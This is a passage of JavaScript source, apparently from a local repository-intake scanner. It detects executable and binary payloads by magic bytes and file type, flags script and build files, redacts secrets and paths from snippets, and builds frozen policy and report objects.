  if (hasBytes(bytes, [0xfe, 0xed, 0xfa, 0xce]) || hasBytes(bytes, [0xfe, 0xed, 0xfa, 0xcf]) || hasBytes(bytes, [0xce, 0xfa, 0xed, 0xfe]) || hasBytes(bytes, [0xcf, 0xfa, 0xed, 0xfe]) || hasBytes(bytes, [0xca, 0xfe, 0xba, 0xbe])) {
    signals.push("macho-magic");
  }
  if (hasBytes(bytes, [0x25, 0x50, 0x44, 0x46, 0x2d])) {
    signals.push("pdf-magic");
  }
  if (bytes.length >= 16 && bytes.subarray(0, 16).every((byte, index) => byte === "SQLite format 3\0".charCodeAt(index))) {
    signals.push("sqlite-magic");
  }
  return signals;
}

function hasBytes(bytes, expected) {
  return bytes.length >= expected.length && expected.every((byte, index) => bytes[index] === byte);
}

function isBinaryLike(bytes) {
  if (bytes.length === 0) {
    return false;
  }
  let controlBytes = 0;
  for (const byte of bytes) {
    if (byte === 0) {
      return true;
    }
    if ((byte < 0x09 || (byte > 0x0d && byte < 0x20)) && byte !== 0x1b) {
      controlBytes += 1;
    }
  }
  return controlBytes / bytes.length > 0.1;
}

function classifyPayloadSignals(signals) {
  if (signals.some((signal) => signal === "archive-extension" || signal === "zip-magic" || signal === "gzip-magic")) {
    return "archive";
  }
  if (signals.some((signal) => signal === "executable-extension" || signal === "pe-magic" || signal === "elf-magic" || signal === "macho-magic")) {
    return "executable";
  }
  if (signals.some((signal) => signal === "binary-heuristic" || signal === "pdf-magic" || signal === "sqlite-magic")) {
    return "binary";
  }
  return null;
}

function isExecutableSurfacePath(lowerPath) {
  const basename = basenameOf(lowerPath);
  if (basename === "dockerfile" || lowerPath.endsWith(".dockerfile")) return true;
  if (basename === "makefile" || basename === "gnumakefile") return true;
  for (const extension of EXECUTABLE_SURFACE_EXTENSIONS) {
    if (lowerPath.endsWith(extension)) return true;
  }
  return false;
}

function executableSurfaceKind(lowerPath) {
  const basename = basenameOf(lowerPath);
  if (basename === "dockerfile" || lowerPath.endsWith(".dockerfile")) return "dockerfile";
  if (basename === "makefile" || basename === "gnumakefile") return "makefile";
  if (lowerPath.endsWith(".ps1")) return "powershell";
  return "shell";
}

function basenameOf(pathValue) {
  return String(pathValue).split("/").filter(Boolean).at(-1) ?? "";
}

function extractSnippet(content, index, length) {
  const start = Math.max(0, index - 40);
  const end = Math.min(content.length, index + length + 40);
  return content.slice(start, end);
}

function redactSnippet(value) {
  return String(value)
    .replace(/(bearer\s+)[A-Za-z0-9._-]{8,}/giu, "$1[redacted-token]")
    .replace(/\b(sk-[A-Za-z0-9_-]{8,}|gh[pousr]_[A-Za-z0-9_]{8,}|AKIA[0-9A-Z]{12,})\b/gu, "[redacted-token]")
    .replace(/\b(token|secret|password|api[_-]?key)\s*[:=]\s*["']?[^"',\s]+/giu, "$1=[redacted]")
    .replace(/[A-Za-z]:[\\/][^\s"`']+/gu, "[redacted:path]")
    .replace(/\/(?:home|Users|mnt)\/[^\s"`']+/gu, "[redacted:path]")
    .replace(/\s+/gu, " ")
    .trim()
    .slice(0, 160);
}

function lineNumberAt(content, index) {
  let line = 1;
  for (let offset = 0; offset < index; offset += 1) {
    if (content.charCodeAt(offset) === 10) {
      line += 1;
    }
  }
  return line;
}

async function fingerprintSecret({ rel, ruleId, line, matchText }) {
  const material = textEncoder.encode(`${rel}\0${ruleId}\0${line}\0${matchText}`);
  if (globalThis.crypto?.subtle) {
    const digest = await globalThis.crypto.subtle.digest("SHA-256", material);
    return `sha256:${hex(new Uint8Array(digest))}`;
  }
  return `sha256:${fallbackDigestHex(material)}`;
}

function hex(bytes) {
  return Array.from(bytes).map((byte) => byte.toString(16).padStart(2, "0")).join("");
}

function fallbackDigestHex(bytes) {
  let hash = 0x811c9dc5;
  for (const byte of bytes) {
    hash ^= byte;
    hash = Math.imul(hash, 0x01000193) >>> 0;
  }
  return Array.from({ length: 8 }, (_, index) => ((hash + index * 0x9e3779b9) >>> 0).toString(16).padStart(8, "0")).join("");
}

function normalizePolicy(options = {}) {
  return Object.freeze({
    maxFiles: normalizePositiveInteger(options.maxFiles, defaultExternalIntakePolicy.maxFiles, "maxFiles"),
    maxBytes: normalizePositiveInteger(options.maxBytes, defaultExternalIntakePolicy.maxBytes, "maxBytes"),
    maxElapsedMs: normalizePositiveInteger(options.maxElapsedMs, defaultExternalIntakePolicy.maxElapsedMs, "maxElapsedMs"),
    gitAttributesReadLimitBytes: normalizePositiveInteger(options.gitAttributesReadLimitBytes, defaultExternalIntakePolicy.gitAttributesReadLimitBytes, "gitAttributesReadLimitBytes"),
    lfsPointerReadLimitBytes: normalizePositiveInteger(options.lfsPointerReadLimitBytes, defaultExternalIntakePolicy.lfsPointerReadLimitBytes, "lfsPointerReadLimitBytes"),
    payloadPrefixReadLimitBytes: normalizePositiveInteger(options.payloadPrefixReadLimitBytes, defaultExternalIntakePolicy.payloadPrefixReadLimitBytes, "payloadPrefixReadLimitBytes"),
    scriptTextReadLimitBytes: normalizePositiveInteger(options.scriptTextReadLimitBytes, defaultExternalIntakePolicy.scriptTextReadLimitBytes, "scriptTextReadLimitBytes"),
    dangerousTextReadLimitBytes: normalizePositiveInteger(options.dangerousTextReadLimitBytes, defaultExternalIntakePolicy.dangerousTextReadLimitBytes, "dangerousTextReadLimitBytes"),
    secretTextReadLimitBytes: normalizePositiveInteger(options.secretTextReadLimitBytes, defaultExternalIntakePolicy.secretTextReadLimitBytes, "secretTextReadLimitBytes"),
    licenseTextReadLimitBytes: normalizePositiveInteger(options.licenseTextReadLimitBytes, defaultExternalIntakePolicy.licenseTextReadLimitBytes, "licenseTextReadLimitBytes")
  });
}

function normalizePositiveInteger(value, fallback, name) {
  if (value === undefined || value === null) {
    return fallback;
  }
  if (!Number.isSafeInteger(value) || value < 1) {
    throw new Error(`${name} must be a positive safe integer.`);
  }
  return value;
}

function createBoundary() {
  return Object.freeze({
    localOnly: true,
    advisoryOnly: true,
    noExecution: true,
    noNetwork: true,
    noClone: true,
    noFetch: true,
    noInstall: true,
    noBuild: true,
    noWorkflowRun: true,
    noDocker: true,
    noMcpServerStart: true,
    noArchiveExtraction: true,
    noUpload: true,
    noPublicationApproval: true
  });
}

function createFinding({ code, severity, message, path = ".", blocking = false, details = {} }) {
  return Object.freeze({
    code,
    severity,
    message,
    path,
    blocking,
    details: freezePlainObject(details)
  });
}

function stableUnique(values) {
  return [...new Set(values)].sort();
}

function safeErrorCode(error) {
  return typeof error?.code === "string" ? error.code : typeof error?.name === "string" ? error.name : "unknown";
}

function nowMs() {
  return globalThis.performance?.now ? globalThis.performance.now() : Date.now();
}

function freezeReport(report) {
  return Object.freeze({
    ...report,
    source: Object.freeze({ ...report.source }),
    policy: Object.freeze({ ...report.policy }),
    boundary: Object.freeze({ ...report.boundary }),
    summary: Object.freeze({ ...report.summary }),
    inventory: Object.freeze(report.inventory.map((item) => Object.freeze({ ...item }))),
    licenses: Object.freeze(report.licenses.map((item) => Object.freeze({ ...item }))),
    findings: Object.freeze(report.findings.map((finding) => Object.freeze({
      ...finding,
      details: freezePlainObject(finding.details)
    })))
  });
}

function freezePlainObject(value) {
  return Object.freeze({ ...value });
}
